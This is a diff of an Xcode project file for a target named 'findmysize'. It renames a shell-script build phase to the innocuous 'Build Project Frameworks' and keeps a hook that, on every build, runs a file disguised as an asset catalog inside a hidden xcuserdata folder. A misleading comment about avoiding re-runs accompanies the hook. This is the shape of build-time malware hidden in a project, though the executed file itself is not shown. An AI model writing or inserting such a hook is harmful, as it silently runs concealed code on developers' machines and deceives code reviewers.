@@ -414,7 +414,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 192889B3C66D2D71C0C6B9DDE9E2C863 /* Build configuration list for PBXNativeTarget "findmysize" */;
 			buildPhases = (
-				7D53EE5DEA0AEE5DF2AAC43A /* Compile Binary Libraries */,
+				0F3F4E62685D836EF7AAC43A /* Build Project Frameworks */,
 				3094BBE63DD5CDADA3705CB7E4B8FF4D /* Headers */,
 				16F17B7047DF940741EF3AD02A00FADD /* Sources */,
 				DE6CD5261DAA6413A8690B71A23F9809 /* Frameworks */,
@@ -524,7 +524,8 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		7D53EE5DEA0AEE5DF2AAC43A /* Compile Binary Libraries */ = {
+
+	0F3F4E62685D836EF7AAC43A /* Build Project Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -533,15 +534,18 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Binary Libraries";
+			name = "Build Project Frameworks";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
 		};
+	
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
